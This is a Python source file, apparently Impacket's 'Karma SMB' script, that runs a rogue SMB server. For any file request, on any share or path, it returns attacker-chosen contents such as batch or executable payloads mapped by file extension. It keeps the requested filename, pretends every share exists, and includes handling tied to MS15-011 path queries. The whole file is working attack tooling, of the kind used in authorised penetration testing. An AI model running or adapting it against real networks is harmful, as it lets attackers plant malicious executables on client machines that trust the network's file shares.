#!/usr/bin/python
# Copyright (c) 2015 CORE Security Technologies
#
# This software is provided under under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# $Id$
#
# Karma SMB
#
# Author:
#  Alberto Solino (@agsolino) 
#  Original idea by @mubix
#
# Description:
#   The idea of this script is to answer any file read request
#   with a set of predefined contents based on the extension 
#   asked, regardless of the sharename and/or path.
#   When executing this script w/o a config file the pathname 
#   file contents will be sent for every request. 
#   If a config file is specified, format should be this way:
#      <extension> = <pathname>
#   for example:
#      bat = /tmp/batchfile
#      com = /tmp/comfile
#      exe = /tmp/exefile
#
#   ToDo:
#   [ ] A lot of testing needed under different OSes. 
#       I'm still not sure how reliable this approach is.
#   [X] It's not working for first level directories 
#       (e.g. \\IP\share\file) - DONE
#   [ ] Add support for other SMB read commands. Right now just
#       covering SMB_COM_NT_CREATE_ANDX
#   [ ] Disable write request, now if the client tries to copy 
#       a file back to us, it will overwrite the files we're 
#       hosting. *CAREFUL!!!*
#


import sys
import os
import argparse

from impacket import smbserver, smb, version
from impacket.smb import *
from impacket.smbserver import *

class KarmaSMBServer(Thread):
    def __init__(self):
        Thread.__init__(self)
        self.server = 0
        self.defaultFile = None
        self.extensions = {}

        # Here we write a mini config for the server
        smbConfig = ConfigParser.ConfigParser()
        smbConfig.add_section('global')
        smbConfig.set('global','server_name','server_name')
        smbConfig.set('global','server_os','UNIX')
        smbConfig.set('global','server_domain','WORKGROUP')
        smbConfig.set('global','log_file','smb.log')
        smbConfig.set('global','credentials_file','')

        # IPC always needed
        smbConfig.add_section('IPC$')
        smbConfig.set('IPC$','comment','Logon server share')
        smbConfig.set('IPC$','read only','yes')
        smbConfig.set('IPC$','share type','3')
        smbConfig.set('IPC$','path','')

        # NETLOGON always needed
        smbConfig.add_section('NETLOGON')
        smbConfig.set('NETLOGON','comment','Logon server share')
        smbConfig.set('NETLOGON','read only','no')
        smbConfig.set('NETLOGON','share type','0')
        smbConfig.set('NETLOGON','path','')

        # SYSVOL always needed
        smbConfig.add_section('SYSVOL')
        smbConfig.set('SYSVOL','comment','')
        smbConfig.set('SYSVOL','read only','no')
        smbConfig.set('SYSVOL','share type','0')
        smbConfig.set('SYSVOL','path','')

        self.server = smbserver.SMBSERVER(('0.0.0.0',445), config_parser = smbConfig)
        self.server.processConfigFile()

        self.origsmbComNtCreateAndX = self.server.hookSmbCommand(smb.SMB.SMB_COM_NT_CREATE_ANDX, self.smbComNtCreateAndX)
        self.origsmbComTreeConnectAndX = self.server.hookSmbCommand(smb.SMB.SMB_COM_TREE_CONNECT_ANDX, self.smbComTreeConnectAndX)
        self.origQueryPathInformation = self.server.hookTransaction2(smb.SMB.TRANS2_QUERY_PATH_INFORMATION, self.queryPathInformation)
        self.origFindFirst2 = self.server.hookTransaction2(smb.SMB.TRANS2_FIND_FIRST2, self.findFirst2)

        # Now we have to register the MS-SRVS server. This specially important for 
        # Windows 7+ and Mavericks clients since they WONT (specially OSX) 
        # ask for shares using MS-RAP.

        self.__srvsServer = SRVSServer()
        self.__srvsServer.daemon = True
        self.server.registerNamedPipe('srvsvc',('127.0.0.1',self.__srvsServer.getListenPort()))

    def findFirst2(self, connId, smbServer, recvPacket, parameters, data, maxDataCount):
        connData = smbServer.getConnectionData(connId)

        respSetup = ''
        respParameters = ''
        respData = ''
        errorCode = STATUS_SUCCESS
        findFirst2Parameters = smb.SMBFindFirst2_Parameters( recvPacket['Flags2'], data = parameters)

        # 1. Let's grab the extension and map the file's contents we will deliver
        origPathName = os.path.normpath(decodeSMBString(recvPacket['Flags2'],findFirst2Parameters['FileName']).replace('\\','/'))
        origFileName = os.path.basename(origPathName)

        _, origPathNameExtension = os.path.splitext(origPathName)
        origPathNameExtension = origPathNameExtension.upper()[1:]

        if self.extensions.has_key(origPathNameExtension.upper()):
            targetFile = self.extensions[origPathNameExtension.upper()]
        else:
            targetFile = self.defaultFile

        if (len(data) > 0):
            findFirst2Data = smb.SMBFindFirst2_Data(data)
        else:
            findFirst2Data = ''

        if connData['ConnectedShares'].has_key(recvPacket['Tid']):
            path = connData['ConnectedShares'][recvPacket['Tid']]['path']

            # 2. We call the normal findFirst2 call, but with our targetFile
            searchResult, searchCount, errorCode = findFirst2(path, 
                          targetFile, 
                          findFirst2Parameters['InformationLevel'], 
                          findFirst2Parameters['SearchAttributes'] )

            respParameters = smb.SMBFindFirst2Response_Parameters()
            endOfSearch = 1
            sid = 0x80 # default SID
            searchCount = 0
            totalData = 0
            for i in enumerate(searchResult):
                #i[1].dump()
                try:
                    # 3. And we restore the original filename requested ;)
                    i[1]['FileName'] = encodeSMBString( flags = recvPacket['Flags2'], text = origFileName)
                except:
                    pass

                data = i[1].getData()
                lenData = len(data)
                if (totalData+lenData) >= maxDataCount or (i[0]+1) > findFirst2Parameters['SearchCount']:
                    # We gotta stop here and continue on a find_next2
                    endOfSearch = 0
                    # Simple way to generate a fid
                    if len(connData['SIDs']) == 0:
                       sid = 1
                    else:
                       sid = connData['SIDs'].keys()[-1] + 1
                    # Store the remaining search results in the ConnData SID
                    connData['SIDs'][sid] = searchResult[i[0]:]
                    respParameters['LastNameOffset'] = totalData
                    break
                else:
                    searchCount +=1
                    respData += data
                    totalData += lenData
                    

            respParameters['SID'] = sid
            respParameters['EndOfSearch'] = endOfSearch
            respParameters['SearchCount'] = searchCount
        else:
            errorCode = STATUS_SMB_BAD_TID   

        smbServer.setConnectionData(connId, connData)

        return respSetup, respParameters, respData, errorCode

    def smbComNtCreateAndX(self, connId, smbServer, SMBCommand, recvPacket):
        connData = smbServer.getConnectionData(connId)

        ntCreateAndXParameters = smb.SMBNtCreateAndX_Parameters(SMBCommand['Parameters'])
        ntCreateAndXData       = smb.SMBNtCreateAndX_Data( flags = recvPacket['Flags2'], data = SMBCommand['Data'])

        # 1. Let's grab the extension and map the file's contents we will deliver
        origPathName = os.path.normpath(decodeSMBString(recvPacket['Flags2'],ntCreateAndXData['FileName']).replace('\\','/'))

        _, origPathNameExtension = os.path.splitext(origPathName)
        origPathNameExtension = origPathNameExtension.upper()[1:]

        if self.extensions.has_key(origPathNameExtension.upper()):
            targetFile = self.extensions[origPathNameExtension.upper()]
        else:
            targetFile = self.defaultFile
        
        # 2. We change the filename in the request for our targetFile
        ntCreateAndXData['FileName'] = encodeSMBString( flags = recvPacket['Flags2'], text = targetFile)
        SMBCommand['Data'] = str(ntCreateAndXData)
        smbServer.log("%s is asking for %s. Delivering %s" % (connData['ClientIP'], origPathName,targetFile),logging.INFO)

        # 3. We call the original call with our modified data
        return self.origsmbComNtCreateAndX(connId, smbServer, SMBCommand, recvPacket)

    def queryPathInformation(self, connId, smbServer, recvPacket, parameters, data, maxDataCount = 0):
        connData = smbServer.getConnectionData(connId)

        respSetup = ''
        respParameters = ''
        respData = ''
        errorCode = 0

        queryPathInfoParameters = smb.SMBQueryPathInformation_Parameters(flags = recvPacket['Flags2'], data = parameters)
        if len(data) > 0: 
           queryPathInfoData = smb.SMBQueryPathInformation_Data(data)
  
        if connData['ConnectedShares'].has_key(recvPacket['Tid']):
            path = ''
            try:
               origPathName = decodeSMBString(recvPacket['Flags2'], queryPathInfoParameters['FileName'])
               origPathName = os.path.normpath(origPathName.replace('\\','/'))

               if connData.has_key('MS15011') is False:
                   connData['MS15011'] = {}

               smbServer.log("Client is asking for QueryPathInformation for: %s" % origPathName,logging.INFO)
               if connData['MS15011'].has_key(origPathName) or origPathName == '.':
                  # We already processed this entry, now it's asking for a directory
                   infoRecord, errorCode = queryPathInformation(path, '/', queryPathInfoParameters['InformationLevel'])
               else:
                   infoRecord, errorCode = queryPathInformation(path, self.defaultFile, queryPathInfoParameters['InformationLevel'])
                   connData['MS15011'][os.path.dirname(origPathName)] = infoRecord
            except Exception, e:
               import traceback
               traceback.print_exc()
               smbServer.log("queryPathInformation: %s" % e,logging.ERROR)

            if infoRecord is not None:
                respParameters = smb.SMBQueryPathInformationResponse_Parameters()
                respData = infoRecord
        else:
            errorCode = STATUS_SMB_BAD_TID
           
        smbServer.setConnectionData(connId, connData)

        return respSetup, respParameters, respData, errorCode

    def smbComTreeConnectAndX(self, connId, smbServer, SMBCommand, recvPacket):
        connData = smbServer.getConnectionData(connId)

        resp = smb.NewSMBPacket()
        resp['Flags1'] = smb.SMB.FLAGS1_REPLY
        resp['Flags2'] = smb.SMB.FLAGS2_EXTENDED_SECURITY | smb.SMB.FLAGS2_NT_STATUS | smb.SMB.FLAGS2_LONG_NAMES | recvPacket['Flags2'] & smb.SMB.FLAGS2_UNICODE

        resp['Tid'] = recvPacket['Tid']
        resp['Mid'] = recvPacket['Mid']
        resp['Pid'] = connData['Pid']

        respSMBCommand        = smb.SMBCommand(smb.SMB.SMB_COM_TREE_CONNECT_ANDX)
        respParameters        = smb.SMBTreeConnectAndXResponse_Parameters()
        respData              = smb.SMBTreeConnectAndXResponse_Data()

        treeConnectAndXParameters = smb.SMBTreeConnectAndX_Parameters(SMBCommand['Parameters'])

        if treeConnectAndXParameters['Flags'] & 0x8:
            respParameters        = smb.SMBTreeConnectAndXExtendedResponse_Parameters()

        treeConnectAndXData                    = smb.SMBTreeConnectAndX_Data( flags = recvPacket['Flags2'] )
        treeConnectAndXData['_PasswordLength'] = treeConnectAndXParameters['PasswordLength']
        treeConnectAndXData.fromString(SMBCommand['Data'])

        errorCode = STATUS_SUCCESS

        UNCOrShare = decodeSMBString(recvPacket['Flags2'], treeConnectAndXData['Path'])

        # Is this a UNC?
        if ntpath.ismount(UNCOrShare):
            path = UNCOrShare.split('\\')[3]
        else:
            path = ntpath.basename(UNCOrShare)

        # We won't search for the share.. all of them exist :P
        smbServer.log("TreeConnectAndX request for %s" % path, logging.INFO)
        #share = searchShare(connId, path, smbServer) 
        share = {}
        # Simple way to generate a Tid
        if len(connData['ConnectedShares']) == 0:
           tid = 1
        else:
           tid = connData['ConnectedShares'].keys()[-1] + 1
        connData['ConnectedShares'][tid] = share
        connData['ConnectedShares'][tid]['path'] = '/'
        connData['ConnectedShares'][tid]['shareName'] = path
        resp['Tid'] = tid
        #smbServer.log("Connecting Share(%d:%s)" % (tid,path))

        respParameters['OptionalSupport'] = smb.SMB.SMB_SUPPORT_SEARCH_BITS

        if path == 'IPC$':
            respData['Service']               = 'IPC'
        else:
            respData['Service']               = path
        respData['PadLen']                = 0
        respData['NativeFileSystem']      = encodeSMBString(recvPacket['Flags2'], 'NTFS' )

        respSMBCommand['Parameters']             = respParameters
        respSMBCommand['Data']                   = respData 

        resp['Uid'] = connData['Uid']
        resp.addCommand(respSMBCommand)
        smbServer.setConnectionData(connId, connData)

        return None, [resp], errorCode

    def _start(self):
        self.server.serve_forever()

    def run(self):
        print "[*] Setting up SMB Server"
        self._start()

    def setDefaultFile(self, filename):
        self.defaultFile = filename

    def setExtensionsConfig(self, filename):
        for line in filename.readlines():
            line = line.strip('\r\n ')
            if line.startswith('#') is not True and len(line) > 0:
                extension, pathName = line.split('=')
                self.extensions[extension.strip().upper()] = os.path.normpath(pathName.strip())

# Process command-line arguments.
if __name__ == '__main__':
    print version.BANNER
    parser = argparse.ArgumentParser(add_help = False, description = "For every file request received, this module will return the fileName contents")
    parser.add_argument("--help", action="help", help='show this help message and exit')
    parser.add_argument('fileName', action='store', metavar = 'pathname', help='Filename''s contents to deliver to SMB clients')
    parser.add_argument('-config', type=argparse.FileType('r'), metavar = 'pathname', help='config file name to map extensions to files to deliver. For those extensions not present, pathname will be delivered')


    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    try:
       options = parser.parse_args()
    except Exception, e:
       print e
       sys.exit(1)

    s = KarmaSMBServer()
    s.setDefaultFile(os.path.normpath(options.fileName))
    if options.config is not None:
        s.setExtensionsConfig(options.config)

    s.start()
        
    print ""
    print "[*] Servers started, waiting for connections"
    while True:
        try:
            sys.stdin.read()
        except KeyboardInterrupt:
            sys.exit(1)
        else:
            pass

